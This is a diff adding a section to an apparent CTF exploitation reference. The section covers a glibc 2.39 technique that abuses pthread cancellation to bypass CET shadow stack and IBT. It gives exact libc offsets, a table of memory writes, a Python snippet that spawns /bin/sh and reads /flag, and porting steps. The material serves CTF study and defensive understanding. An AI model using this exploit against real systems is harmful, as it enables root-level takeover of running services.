@@ -13,6 +13,7 @@
 - [Heap Overlap via Base Conversion](#heap-overlap-via-base-conversion)
 - [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
 - [ret2dlresolve](#ret2dlresolve)
+- [Control Transfer Without a Return Address (pthread Cancellation)](#control-transfer-without-a-return-address-pthread-cancellation)
 - [Kernel Exploitation](#kernel-exploitation) (basic; see [kernel.md](kernel.md) for full coverage)
 - [9-Byte test+je Timing Leak (hxp 2018)](#9-byte-testje-timing-leak-hxp-2018)
 - [RtlCaptureContext Deterministic Windows Stack Leak (Insomnihack 2017)](#rtlcapturecontext-deterministic-windows-stack-leak-insomnihack-2017)
@@ -219,6 +220,96 @@ fake_sym_st_name = fake_string_addr - STRTAB
 **Key insight:** ret2dlresolve works without ANY leak. It exploits the lazy binding mechanism: when a PLT function is called for the first time, the dynamic linker looks up the symbol name and resolves it. By forging the lookup structures, you can make it resolve any libc function. Use pwntools' `Ret2dlresolvePayload` for automation.
 
 **Requirements:** Partial RELRO (Full RELRO resolves all symbols at load time, defeating this). Writable memory to place forged structures.
+
+---
+
+## Control Transfer Without a Return Address (pthread Cancellation)
+
+**Pattern:** You have arbitrary read/write but no return address to hijack: `main` is a `for(;;)` loop that never returns, the GOT is full RELRO, and the ELF declares `IBT, SHSTK`, so return-address overwrites die on the shadow stack. glibc's asynchronous-cancellation slow path still hands control to an **indirect `jmp`** inside the libc `_Unwind_ForcedUnwind` wrapper, and CET polices `ret`, not this `jmp`.
+
+```asm
+; inside libc's _Unwind_ForcedUnwind wrapper
+ror  $0x11, %rax          ; PTR_DEMANGLE
+xor  %fs:0x30, %rax       ; pointer guard
+jmp  *%rax                ; indirect jump - SHSTK never sees a return
+```
+
+The only IBT requirement is that the target starts with `endbr64`; `system` does.
+
+### Trigger path (glibc 2.39)
+
+```
+read()/write()/usleep() ... any SYSCALL_CANCEL wrapper
+  +- if (!__libc_single_threaded) __libc_enable_asynccancel()
+  |    rcx = fs:0x10                  ; THREAD_SELF
+  |    edx = [rcx + 0x308]            ; cancelhandling
+  |    if (cancelhandling & CANCELED) __do_cancel()
+  +- __pthread_unwind(exc = self + 0x670)
+     +- _Unwind_ForcedUnwind()
+        if (![libc + unwind_flag]) dlopen libgcc_s ...   ; avoided by writing the flag
+        else rax = [static_unwind_struct + 8]
+        ror 0x11 / xor fs:0x30 / jmp *rax                 ; rdi = self + 0x670
+```
+
+### The writes
+
+| address | value |
+|---|---|
+| `fake_self + 0x308` | `8` (`cancelhandling`, CANCELED bit) |
+| `fake_self + 0x670` | `"/bin/sh\0"` - becomes `rdi` at the `jmp` |
+| `fs_base + 0x10` | `fake_self` (`THREAD_SELF`, **not** the CPU `fs_base` itself) |
+| `libc + unwind_flag` | `1` - use the static unwind struct instead of `dlopen`ing libgcc_s |
+| `libc + unwind_fptr` | `ROL(system ^ guard, 0x11)` |
+| `libc + __libc_single_threaded` | `0` - **write last**; it is what routes the next syscall wrapper onto the slow path |
+
+`guard = *(u64 *)(fs_base + 0x30)` must be read **before** `fs:0x10` is replaced, and
+`rol(v, n) = ((v << n) | (v >> (64 - n)))`.
+
+glibc 2.39 x86-64 (Ubuntu 24.04, BuildID `328820b908de8ea1ef79afa8995e302e819163d7`) worked example:
+`system +0x58750`, `__libc_single_threaded +0x20b040`, `unwind flag +0x20b068`,
+`static unwind struct +0x20b080` (fn ptr at `+8` = `+0x20b088`),
+`__libc_enable_asynccancel +0x98630`, `_Unwind_ForcedUnwind wrapper +0x2a630`.
+
+### Trigger and shell
+
+Write the first five entries, then zero `__libc_single_threaded` and immediately perform a cancellable libc call - in a protocol daemon the next reply `write()` is enough. The reply never arrives (the shell owns the fd) so stop waiting for it:
+
+```python
+guard = rd(fs_base + 0x30)                      # read BEFORE touching fs:0x10
+fake  = rd(fs_base + 0x10) + 0x100              # fake TCB carved out of the real one
+
+wr(fake + 0x308, p32(8))                        # cancelhandling, CANCELED bit
+wr(fake + 0x670, b"/bin/sh\x00")                 # rdi at the jmp
+wr(fs_base + 0x10, p64(fake))                   # THREAD_SELF -> fake TCB
+wr(libc + UNWIND_FLAG, p64(1))                  # static unwind struct, no libgcc_s dlopen
+wr(libc + UNWIND_FPTR, p64(rol((libc + SYSTEM) ^ guard, 0x11)))
+wr(libc + SINGLE_THREADED, p64(0))              # LAST: next syscall wrapper cancels
+send_trigger()
+time.sleep(0.4)
+send(b"id; cat /flag*\n")                        # non-interactive shell, no prompt
+```
+
+### Porting to another libc
+
+1. `system`: `readelf -sW libc.so.6 | grep ' system@@'`.
+2. `__libc_enable_asynccancel`: disassemble and find `mov %fs:0x10,%rax` / `mov 0x308(%rax),%edx` / `lea 0x308(%rax),%rdi`; the `0x308` `cancelhandling` offset moves between versions.
+3. `_Unwind_ForcedUnwind` wrapper: find the function containing `call __libc_unwind_link_get` followed by `ror $0x11` / `xor %fs:0x30` / `jmp *%rax`; its `mov 0x8(%rax),%rax` identifies the static struct layout.
+4. `__libc_single_threaded`: exported by most builds (`readelf -sW | grep single_threaded`), else find the `cmpb $0x0,...` in the `read`/`write` wrappers.
+5. `unwind flag`: the global the wrapper tests before falling back to `dlopen`.
+
+### Failure modes
+
+| symptom | cause |
+|---|---|
+| silent death, no shell | guard read *after* `fs:0x10` was already replaced |
+| crash at `jmp *%rax` | mangling direction - disguising needs `rol`, demangling is `ror`; or a wrong guard |
+| normal reply, nothing happens | `__libc_single_threaded` still 1, or the call is not a cancellation point |
+| crash before the trigger fires | fake TCB installed too early: any libc TLS access (errno, stack canary, malloc) lands in it |
+| shell but no 4-byte reply | expected; the takeover happens inside the reply `write()` |
+
+**When to recognize:** `main` never returns, full RELRO, `IBT`/`SHSTK` in `GNU_PROPERTY`, and the program loops on `read`/`write`/`recv` - returning is impossible but a cancellable libc call is guaranteed.
+
+**References:** glibc `nptl/cancellation.c`, `sysdeps/pthread/unwind-forcedunwind.c`, `sysdeps/unix/sysv/linux/{read,write}.c`, `sysdeps/x86_64/pointer_guard.h`; QWNT 2026 `diagnosticd` (glibc 2.39), verified locally to `system("/bin/sh")` as root.
 
 ---
 
